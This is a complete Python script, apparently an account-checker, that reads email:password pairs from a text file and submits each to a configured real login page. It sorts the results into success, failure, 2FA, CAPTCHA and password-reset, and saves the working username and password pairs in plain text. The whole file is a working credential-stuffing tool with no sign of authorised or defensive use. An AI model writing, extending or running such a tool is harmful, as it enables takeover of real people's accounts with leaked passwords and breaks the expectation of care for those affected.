#!/usr/bin/env python3
"""
🔐 Real Account Login Validator
Validates credentials from text file against real login pages
Reports: SUCCESS, FAIL, 2FA, CAPTCHA, RESET_PASSWORD errors
"""

import json
import time
import logging
import asyncio
from datetime import datetime
from typing import Dict, List, Tuple
from pathlib import Path
import httpx
from urllib.parse import urljoin

# ==================== CONFIGURATION ====================
CREDENTIALS_FILE = "credentials.txt"
CONFIG_FILE = "site_config.json"
RESULTS_FILE = f"results_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
LOG_FILE = "validator.log"

# ==================== LOGGING ====================
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s | %(levelname)s | %(message)s',
    handlers=[
        logging.StreamHandler(),
        logging.FileHandler(LOG_FILE)
    ]
)
logger = logging.getLogger(__name__)

# ==================== LOGIN STATUS ENUM ====================
class LoginStatus:
    SUCCESS = "✅ SUCCESS"
    FAILED = "❌ FAILED"
    TWO_FA = "🔐 2FA_REQUIRED"
    CAPTCHA = "🤖 CAPTCHA_REQUIRED"
    RESET_PASSWORD = "🔄 RESET_PASSWORD"
    ERROR = "⚠️ ERROR"
    TIMEOUT = "⏱️ TIMEOUT"

# ==================== CREDENTIAL LOADER ====================
def load_credentials(filepath: str) -> List[Tuple[str, str]]:
    """Load credentials from text file"""
    credentials = []
    
    try:
        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
            for line_num, line in enumerate(f, 1):
                line = line.strip()
                
                # Skip empty lines and comments
                if not line or line.startswith('#'):
                    continue
                
                # Parse email:password format
                if ':' in line:
                    parts = line.split(':', 1)
                    if len(parts) == 2:
                        username, password = parts
                        credentials.append((username.strip(), password.strip()))
                    else:
                        logger.warning(f"Line {line_num}: Invalid format - {line}")
                else:
                    logger.warning(f"Line {line_num}: Missing ':' separator - {line}")
        
        logger.info(f"📋 Loaded {len(credentials)} credentials from {filepath}")
        return credentials
        
    except FileNotFoundError:
        logger.error(f"❌ File not found: {filepath}")
        return []
    except Exception as e:
        logger.error(f"❌ Error loading credentials: {e}")
        return []

# ==================== CONFIG LOADER ====================
def load_config(filepath: str) -> Dict:
    """Load site configuration"""
    try:
        with open(filepath, 'r', encoding='utf-8') as f:
            config = json.load(f)
        logger.info(f"⚙️ Loaded configuration from {filepath}")
        return config
    except FileNotFoundError:
        logger.error(f"❌ Config file not found: {filepath}")
        return {}
    except json.JSONDecodeError as e:
        logger.error(f"❌ Invalid JSON in config: {e}")
        return {}

# ==================== LOGIN VALIDATOR ====================
class LoginValidator:
    def __init__(self, site_config: Dict, global_settings: Dict):
        self.site_config = site_config
        self.global_settings = global_settings
        self.results = []
    
    async def validate_credential(self, username: str, password: str) -> Tuple[str, str, str]:
        """
        Validate a single credential
        Returns: (status, username, details)
        """
        login_url = self.site_config.get('login_url', '')
        method = self.site_config.get('method', 'POST').upper()
        
        if not login_url:
            return (LoginStatus.ERROR, username, "No login URL configured")
        
        logger.info(f"🔍 Testing: {username}")
        
        try:
            # Prepare request data
            username_field = self.site_config.get('username_field', 'email')
            password_field = self.site_config.get('password_field', 'password')
            
            data = {
                username_field: username,
                password_field: password
            }
            
            # Add additional fields if configured
            additional_fields = self.site_config.get('additional_fields', {})
            data.update(additional_fields)
            
            # Prepare headers
            headers = self.site_config.get('headers', {})
            if 'Referer' not in headers:
                headers['Referer'] = login_url
            
            # Timeout and SSL settings
            timeout = self.global_settings.get('timeout', 15)
            verify_ssl = self.global_settings.get('verify_ssl', True)
            follow_redirects = self.global_settings.get('follow_redirects', True)
            
            # Create HTTP client
            async with httpx.AsyncClient(
                timeout=httpx.Timeout(timeout),
                headers=headers,
                verify=verify_ssl,
                follow_redirects=follow_redirects
            ) as client:
                
                # Make request
                if method == 'POST':
                    response = await client.post(login_url, data=data)
                else:
                    response = await client.get(login_url, params=data)
                
                # Analyze response
                status, details = self._analyze_response(response, username)
                
                return (status, username, details)
                
        except asyncio.TimeoutError:
            logger.warning(f"⏱️ Timeout: {username}")
            return (LoginStatus.TIMEOUT, username, "Request timeout")
        except Exception as e:
            logger.error(f"⚠️ Error testing {username}: {e}")
            return (LoginStatus.ERROR, username, str(e))
    
    def _analyze_response(self, response: httpx.Response, username: str) -> Tuple[str, str]:
        """Analyze HTTP response to determine login status"""
        
        response_text = response.text.lower()
        status_code = response.status_code
        final_url = str(response.url).lower()
        
        # Check for CAPTCHA (highest priority)
        captcha_indicators = self.site_config.get('captcha_indicators', [])
        for indicator in captcha_indicators:
            if indicator.lower() in response_text:
                logger.warning(f"🤖 CAPTCHA detected for {username}")
                return (LoginStatus.CAPTCHA, f"CAPTCHA required - indicator: {indicator}")
        
        # Check for 2FA
        twofa_indicators = self.site_config.get('2fa_indicators', [])
        for indicator in twofa_indicators:
            if indicator.lower() in response_text:
                logger.warning(f"🔐 2FA required for {username}")
                return (LoginStatus.TWO_FA, f"2FA required - indicator: {indicator}")
        
        # Check for password reset
        reset_indicators = self.site_config.get('reset_indicators', [])
        for indicator in reset_indicators:
            if indicator.lower() in response_text:
                logger.warning(f"🔄 Password reset required for {username}")
                return (LoginStatus.RESET_PASSWORD, f"Password reset required - indicator: {indicator}")
        
        # Check for success indicators
        success_indicators = self.site_config.get('success_indicators', [])
        for indicator in success_indicators:
            if indicator.lower() in response_text or indicator.lower() in final_url:
                logger.info(f"✅ SUCCESS: {username}")
                return (LoginStatus.SUCCESS, f"Login successful - found: {indicator}")
        
        # Check for explicit failure indicators
        fail_indicators = self.site_config.get('fail_indicators', [])
        for indicator in fail_indicators:
            if indicator.lower() in response_text:
                logger.info(f"❌ FAILED: {username}")
                return (LoginStatus.FAILED, f"Invalid credentials - found: {indicator}")
        
        # Status code analysis
        if status_code >= 400:
            return (LoginStatus.FAILED, f"HTTP {status_code} error")
        elif status_code in [200, 302, 303]:
            # Ambiguous - could be success or fail
            # Check URL change as indicator
            if 'dashboard' in final_url or 'home' in final_url or 'account' in final_url:
                return (LoginStatus.SUCCESS, "Redirected to authenticated page")
            else:
                return (LoginStatus.FAILED, "No success indicators found")
        
        return (LoginStatus.FAILED, "Unable to determine status")
    
    def add_result(self, status: str, username: str, password: str, details: str):
        """Add result to results list"""
        self.results.append({
            'status': status,
            'username': username,
            'password': password,
            'details': details,
            'timestamp': datetime.now().isoformat()
        })
    
    def save_results(self, filepath: str):
        """Save results to file"""
        try:
            with open(filepath, 'w', encoding='utf-8') as f:
                f.write("=" * 80 + "\n")
                f.write("🔐 LOGIN VALIDATION RESULTS\n")
                f.write(f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write("=" * 80 + "\n\n")
                
                # Group by status
                status_groups = {}
                for result in self.results:
                    status = result['status']
                    if status not in status_groups:
                        status_groups[status] = []
                    status_groups[status].append(result)
                
                # Write summary
                f.write("📊 SUMMARY\n")
                f.write("-" * 80 + "\n")
                for status, results in status_groups.items():
                    f.write(f"{status}: {len(results)}\n")
                f.write(f"TOTAL: {len(self.results)}\n\n")
                
                # Write successful logins (most important)
                if LoginStatus.SUCCESS in status_groups:
                    f.write("\n" + "=" * 80 + "\n")
                    f.write("✅ SUCCESSFUL LOGINS (NO ERRORS)\n")
                    f.write("=" * 80 + "\n")
                    for result in status_groups[LoginStatus.SUCCESS]:
                        f.write(f"\nUsername: {result['username']}\n")
                        f.write(f"Password: {result['password']}\n")
                        f.write(f"Details: {result['details']}\n")
                        f.write(f"Time: {result['timestamp']}\n")
                        f.write("-" * 80 + "\n")
                
                # Write other statuses
                for status in [LoginStatus.FAILED, LoginStatus.TWO_FA, 
                              LoginStatus.CAPTCHA, LoginStatus.RESET_PASSWORD,
                              LoginStatus.ERROR, LoginStatus.TIMEOUT]:
                    if status in status_groups:
                        f.write(f"\n{status}\n")
                        f.write("-" * 80 + "\n")
                        for result in status_groups[status]:
                            f.write(f"{result['username']}:{result['password']} - {result['details']}\n")
                        f.write("\n")
            
            logger.info(f"💾 Results saved to {filepath}")
            
        except Exception as e:
            logger.error(f"❌ Error saving results: {e}")

# ==================== MAIN FUNCTION ====================
async def main():
    """Main validation process"""
    
    print("=" * 80)
    print("🔐 REAL ACCOUNT LOGIN VALIDATOR")
    print("=" * 80)
    print()
    
    # Load configuration
    config = load_config(CONFIG_FILE)
    if not config:
        logger.error("❌ Failed to load configuration. Exiting.")
        return
    
    # Get site configuration (use first site or prompt)
    sites = config.get('sites', {})
    if not sites:
        logger.error("❌ No sites configured. Exiting.")
        return
    
    # Use first site for now (can be extended to select)
    site_name = list(sites.keys())[0]
    site_config = sites[site_name]
    global_settings = config.get('global_settings', {})
    
    logger.info(f"🌐 Using site configuration: {site_name}")
    logger.info(f"🔗 Login URL: {site_config.get('login_url', 'N/A')}")
    
    # Load credentials
    credentials = load_credentials(CREDENTIALS_FILE)
    if not credentials:
        logger.error("❌ No credentials to validate. Exiting.")
        return
    
    print(f"\n📋 Loaded {len(credentials)} credentials")
    print(f"⏱️ Delay between requests: {global_settings.get('delay_between_requests', 2)}s")
    print(f"📁 Results will be saved to: {RESULTS_FILE}")
    print("\n🚀 Starting validation...\n")
    
    # Create validator
    validator = LoginValidator(site_config, global_settings)
    
    # Process each credential
    delay = global_settings.get('delay_between_requests', 2)
    
    for i, (username, password) in enumerate(credentials, 1):
        print(f"[{i}/{len(credentials)}] Testing: {username}")
        
        status, user, details = await validator.validate_credential(username, password)
        validator.add_result(status, username, password, details)
        
        print(f"  → {status}: {details}")
        
        # Delay between requests (except last one)
        if i < len(credentials):
            await asyncio.sleep(delay)
    
    # Save results
    print(f"\n💾 Saving results to {RESULTS_FILE}...")
    validator.save_results(RESULTS_FILE)
    
    # Print summary
    print("\n" + "=" * 80)
    print("📊 VALIDATION COMPLETE")
    print("=" * 80)
    
    success_count = sum(1 for r in validator.results if r['status'] == LoginStatus.SUCCESS)
    failed_count = sum(1 for r in validator.results if r['status'] == LoginStatus.FAILED)
    twofa_count = sum(1 for r in validator.results if r['status'] == LoginStatus.TWO_FA)
    captcha_count = sum(1 for r in validator.results if r['status'] == LoginStatus.CAPTCHA)
    reset_count = sum(1 for r in validator.results if r['status'] == LoginStatus.RESET_PASSWORD)
    
    print(f"✅ Successful logins: {success_count}")
    print(f"❌ Failed logins: {failed_count}")
    print(f"🔐 2FA required: {twofa_count}")
    print(f"🤖 CAPTCHA required: {captcha_count}")
    print(f"🔄 Password reset required: {reset_count}")
    print(f"📁 Full results: {RESULTS_FILE}")
    print("=" * 80)

# ==================== ENTRY POINT ====================
if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n\n⚠️ Validation interrupted by user")
        logger.info("Validation interrupted by user")
    except Exception as e:
        logger.error(f"❌ Fatal error: {e}")
        print(f"\n❌ Fatal error: {e}")
